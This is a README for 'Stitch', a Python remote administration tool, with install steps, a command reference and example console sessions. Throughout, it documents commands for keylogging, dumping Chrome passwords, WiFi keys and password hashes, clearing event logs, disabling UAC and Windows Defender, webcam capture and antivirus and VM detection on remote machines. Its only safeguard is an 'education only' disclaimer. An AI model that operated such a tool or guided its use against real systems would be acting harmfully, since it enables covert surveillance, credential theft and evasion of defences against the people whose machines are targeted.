# Stitch Python 3.13 - Remote Administration Tool

## ⚠️ DISCLAIMER
**Stitch is for education/research purposes only. The author takes NO responsibility for how you choose to use this tool. Use only on systems you own or have explicit permission to test.**

## About
Stitch is a cross-platform Python remote administration tool that allows you to build custom payloads for Windows, macOS, and Linux. All communications are AES encrypted for security.

## Features
- **Cross-platform support** (Windows, macOS, Linux)
- **AES encrypted communication**
- **Remote shell access**
- **File upload/download**
- **System information gathering**
- **Screenshot capture**
- **Keylogger functionality**
- **Network reconnaissance**
- **Command completion**

## Installation

### Requirements
- Python 3.13+
- Platform-specific dependencies

### Install Dependencies
```bash
# Windows
pip install -r win_requirements.txt

# macOS
pip install -r osx_requirements.txt

# Linux
pip install -r lnx_requirements.txt
```

## Usage

### Start Stitch
```bash
python main.py
```

### Basic Commands

#### Server Management
```bash
listen <port>           # Start listening for connections (default: 4040)
sessions               # Show active connections
shell <ip_address>     # Connect to a specific session
exit                   # Exit Stitch
```

#### Connection Management
```bash
connect <ip> <port>    # Connect to remote Stitch payload
history               # Show connection history
history_remove <ip>   # Remove IP from history
```

#### Encryption
```bash
showkey               # Display current AES encryption key
addkey <key>          # Add AES key to library
```

#### System Commands
```bash
pwd                   # Show current directory
cd <path>             # Change directory
ls                    # List directory contents (Unix-style)
dir                   # List directory contents (Windows-style)
ps                    # Show running processes
```

### Remote Shell Commands
When connected to a remote session:

#### Information Gathering
```bash
sysinfo              # Get detailed system information
environment          # Show environment variables
location             # Get target location info
ps                   # List running processes
```

#### File Operations
```bash
download <file>      # Download file from target
upload <file>        # Upload file to target
cat <file>           # Display file contents
ls                   # List directory contents
cd <path>            # Change directory
```

#### System Control
```bash
screenshot           # Take screenshot
displayoff           # Turn off display
displayon            # Turn on display
lockscreen           # Lock the screen
```

#### Windows-Specific Commands
```bash
drives               # Show drive information
wifikeys             # Dump saved WiFi passwords
chromedump           # Extract Chrome passwords
clearev              # Clear event logs
enableRDP            # Enable Remote Desktop
disableRDP           # Disable Remote Desktop
enableUAC            # Enable User Account Control
disableUAC           # Disable User Account Control
enableWindef         # Enable Windows Defender
disableWindef        # Disable Windows Defender
scanreg              # Scan Windows Registry
```

#### macOS/Linux-Specific Commands
```bash
ssh                  # SSH to another host
sudo <command>       # Run command with sudo
crackpassword        # Attempt password cracking
logintext            # Change login screen text (macOS)
```

#### Cross-Platform Security
```bash
keylogger start      # Start keylogger
keylogger stop       # Stop keylogger
keylogger dump       # Dump keylogger data
keylogger status     # Check keylogger status

firewall status      # Check firewall status
firewall open        # Open firewall port
firewall close       # Close firewall port

hide <file>          # Hide file/directory
unhide <file>        # Unhide file/directory

hashdump             # Dump password hashes
avscan               # Scan for antivirus
vmscan               # Detect virtual machine
```

#### Network & Media
```bash
webcamsnap           # Take webcam snapshot
webcamlist           # List available webcams
popup                # Display popup message
```

## Example Usage

### Basic Server Setup
```bash
# Start Stitch
python main.py

# In Stitch console:
[Stitch] > listen 4040
[+] Now listening on port 4040

[Stitch] > sessions
=== Connected to port 4040 ===

[Stitch] > showkey
=== Stitch AES Key ===
   T3VOR2FybEowS2V6MmdTU2Fjc1YycHU5MnAwa25wR0c=
```

### Connecting to Remote System
```bash
# Wait for connection or connect manually
[Stitch] > connect 192.168.1.100 4040

# Once connected, gather information
[Stitch] > sysinfo
[Stitch] > screenshot
[Stitch] > download C:\Users\user\Desktop\document.txt

# Exit session
[Stitch] > exit
```

### Advanced Operations
```bash
# Start keylogger
[Stitch] > keylogger start

# Take screenshot
[Stitch] > screenshot

# Check system info
[Stitch] > sysinfo

# Dump keylogger data
[Stitch] > keylogger dump

# Stop keylogger
[Stitch] > keylogger stop
```

## Directory Structure
```
Stitch_Python313/
├── main.py              # Main entry point
├── Application/         # Core application code
├── PyLib/              # Python payload library
├── Downloads/          # Downloaded files (auto-created)
├── Uploads/            # Files to upload (auto-created)
├── Logs/               # Application logs (auto-created)
├── Tools/              # Utilities and password lists
└── Requirements files  # Platform-specific dependencies
```

## Security Features

### Encryption
- All communications use AES-256 encryption
- Secure key generation using cryptographically strong methods
- Base64 encoding for safe transmission
- Key management system for multiple encryption keys

### Best Practices
1. **Use only in authorized environments**
2. **Keep encryption keys secure**
3. **Monitor application logs regularly**
4. **Update dependencies regularly**
5. **Follow responsible disclosure for vulnerabilities**

## Troubleshooting

### Common Issues
- **Import errors**: Reinstall dependencies with `pip install -r <platform>_requirements.txt`
- **Connection issues**: Check firewall settings and ensure ports are open
- **Permission errors**: Run with appropriate privileges if needed

### Getting Help
```bash
# In Stitch console
help                 # Show all available commands
help <command>       # Get help for specific command
```
